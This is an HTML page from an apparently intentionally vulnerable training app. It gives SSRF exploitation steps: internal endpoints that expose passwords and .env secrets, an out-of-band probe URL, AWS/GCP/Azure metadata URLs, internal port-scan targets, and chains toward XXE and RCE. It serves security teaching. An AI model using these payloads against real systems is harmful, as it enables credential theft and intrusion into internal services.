<div class="container" style="padding:40px 0;">
  <div style="max-width:700px;margin:0 auto;">
    <div class="section-title">
      <h2>🕸️ SSRF Exploitation Guide</h2>
      <p class="subtitle">A10: Server-Side Request Forgery</p>
      <div class="accent-line"></div>
    </div>

    <div class="alert alert-danger">
      🎯 <strong>SSRF Lab:</strong> The avatar fetch endpoint makes HTTP requests to ANY URL you provide! Use this to access internal services.
    </div>

    <!-- Internal Services Section -->
    <div class="card" style="padding:24px;margin-bottom:20px;">
      <h3 style="margin-bottom:16px;">🔗 Internal Services to Target</h3>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
        <div class="card" style="padding:16px;border-color:var(--accent);">
          <h4>📋 Debug Endpoint</h4>
          <p style="font-size:0.85rem;color:var(--text-muted);">Get all users, passwords, config</p>
          <code style="font-size:0.8rem;">http://localhost:3000/debug</code>
        </div>
        <div class="card" style="padding:16px;border-color:var(--accent);">
          <h4>🔐 Auth Service</h4>
          <p style="font-size:0.85rem;color:var(--text-muted);">Simulated internal auth API</p>
          <code style="font-size:0.8rem;">http://localhost:3000/.env</code>
        </div>
        <div class="card" style="padding:16px;border-color:var(--accent);">
          <h4>💽 Database Config</h4>
          <p style="font-size:0.85rem;color:var(--text-muted);">Access database config files</p>
          <code style="font-size:0.8rem;">http://localhost:3000/config.js</code>
        </div>
        <div class="card" style="padding:16px;border-color:var(--accent);">
          <h4>📊 Admin Panel</h4>
          <p style="font-size:0.85rem;color:var(--text-muted);">Internal admin interface</p>
          <code style="font-size:0.8rem;">http://localhost:3000/admin</code>
        </div>
      </div>
    </div>

    <!-- Blind SSRF Section -->
    <div class="card" style="padding:24px;margin-bottom:20px;">
      <h3 style="margin-bottom:16px;">🕵️ Blind SSRF Detection</h3>
      <p style="color:var(--text-muted);font-size:0.9rem;line-height:1.7;">Use the SSRF probe endpoint to detect blind SSRF — it tries to fetch any URL and reports back the response status:</p>
      <div style="margin-top:12px;padding:12px;background:var(--dark-2);border-radius:var(--radius-sm);">
        <p style="color:var(--text-dim);font-size:0.85rem;font-family:'JetBrains Mono',monospace;">
          POST /api/ssrf/probe<br>
          {"url": "http://internal.service/admin"}<br><br>
          # Or for OOB detection:<br>
          {"url": "http://your-collaborator.burpcollaborator.net/test"}
        </p>
      </div>
    </div>

    <!-- Cloud Metadata Section -->
    <div class="card" style="padding:24px;margin-bottom:20px;">
      <h3 style="margin-bottom:16px;">☁️ Cloud Metadata Attacks</h3>
      <p style="color:var(--text-muted);font-size:0.9rem;line-height:1.7;">If deployed to a cloud provider, try these metadata endpoints:</p>
      <table style="width:100%;border-collapse:collapse;font-size:0.85rem;margin-top:12px;">
        <thead>
          <tr style="border-bottom:1px solid var(--border);">
            <th style="padding:8px;text-align:left;">Provider</th>
            <th style="padding:8px;text-align:left;">Metadata URL</th>
          </tr>
        </thead>
        <tbody>
          <tr style="border-bottom:1px solid var(--border);">
            <td style="padding:8px;">AWS</td>
            <td style="padding:8px;font-family:monospace;font-size:0.8rem;">http://169.254.169.254/latest/meta-data/</td>
          </tr>
          <tr style="border-bottom:1px solid var(--border);">
            <td style="padding:8px;">AWS</td>
            <td style="padding:8px;font-family:monospace;font-size:0.8rem;">http://169.254.169.254/latest/user-data/</td>
          </tr>
          <tr style="border-bottom:1px solid var(--border);">
            <td style="padding:8px;">GCP</td>
            <td style="padding:8px;font-family:monospace;font-size:0.8rem;">http://metadata.google.internal/computeMetadata/v1/</td>
          </tr>
          <tr>
            <td style="padding:8px;">Azure</td>
            <td style="padding:8px;font-family:monospace;font-size:0.8rem;">http://169.254.169.254/metadata/instance?api-version=2021-02-01</td>
          </tr>
        </tbody>
      </table>
    </div>

    <!-- Port Scanning Section -->
    <div class="card" style="padding:24px;margin-bottom:20px;">
      <h3 style="margin-bottom:16px;">🔍 Internal Port Scanning</h3>
      <p style="color:var(--text-muted);font-size:0.9rem;line-height:1.7;">Use the SSRF to scan internal ports for other services:</p>
      <div style="margin-top:12px;padding:12px;background:var(--dark-2);border-radius:var(--radius-sm);">
        <p style="color:var(--text-dim);font-size:0.85rem;font-family:'JetBrains Mono',monospace;">
          # Try these internal URLs:<br>
          http://127.0.0.1:3001 → Another web service<br>
          http://127.0.0.1:5432 → PostgreSQL<br>
          http://127.0.0.1:6379 → Redis<br>
          http://127.0.0.1:9200 → Elasticsearch
        </p>
      </div>
    </div>

    <!-- Chain Attacks Section -->
    <div class="card" style="padding:24px;border-color:var(--primary);">
      <h3 style="margin-bottom:16px;color:var(--primary);">⚡ Chain Attacks</h3>
      <ol style="color:var(--text-muted);font-size:0.9rem;line-height:2;padding-left:20px;">
        <li><strong>SSRF → Debug → Admin:</strong> Fetch <code>http://localhost:3000/debug</code> to get admin password, then login as admin</li>
        <li><strong>SSRF → .env → API Keys:</strong> Fetch <code>http://localhost:3000/.env</code> to get exposed secrets</li>
        <li><strong>SSRF → XXE → File Read:</strong> Use SSRF to POST XXE payload to <code>/api/legacy/parse-xml</code></li>
        <li><strong>SSRF → RCE:</strong> If a service on an internal port has RCE, SSRF is the gateway!</li>
      </ol>
    </div>
  </div>
</div>
